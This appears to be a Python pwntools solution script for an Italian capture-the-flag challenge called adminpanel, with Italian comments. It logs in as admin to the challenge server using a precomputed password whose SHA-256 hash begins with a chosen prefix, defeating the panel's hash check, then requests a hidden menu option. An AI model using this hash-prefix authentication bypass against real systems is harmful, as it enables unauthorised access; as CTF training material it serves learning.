from hashlib import sha256
from pwn import *
import os

pswd = b"d482c2606bea2d7a" # precalcolata
"""
while True:
    rnd = os.urandom(8).hex().encode()
    txt = sha256(rnd).hexdigest()
    if txt[:6] == "bed100":
        print(rnd, txt)
        pswd = rnd
        break
"""

# gli hash restituiti romperanno il check

r = remote("adminpanel.challs.olicyber.it", 12200)
r.recvuntil(b"Esci\n")
r.sendline(b'1') # login
r.recvuntil(b": ")
r.sendline(b'admin') # username
r.recvuntil(b': ')
r.sendline(pswd) # password
r.recvuntil(b'Esci\n')
r.sendline(b'53')
print(r.recv(1000))
